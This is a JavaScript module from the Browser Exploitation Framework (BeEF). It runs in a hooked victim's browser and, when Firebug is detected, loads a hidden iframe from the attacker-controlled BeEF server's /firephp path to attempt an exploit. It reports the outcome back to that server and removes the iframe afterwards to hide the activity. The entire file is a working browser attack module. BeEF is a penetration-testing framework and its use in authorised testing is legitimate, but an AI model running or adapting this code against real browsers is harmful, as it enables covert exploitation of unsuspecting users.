//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  // detect firebug
  if (window.console && (window.console.firebug || window.console.exception)) {
    var firephp_<%= @command_id %> = beef.dom.createInvisibleIframe();
    firephp_<%= @command_id %>.src = beef.net.httpproto + "://" + beef.net.host + ":" + beef.net.port + "/firephp";
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
  } else {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "error=Module did not run. Firebug is not open in the hooked browser.");
    return;
  }

  // clean up
  cleanup = function() {
     document.body.removeChild(firephp_<%= @command_id %>);
  }
  setTimeout("cleanup()", 10000);

});

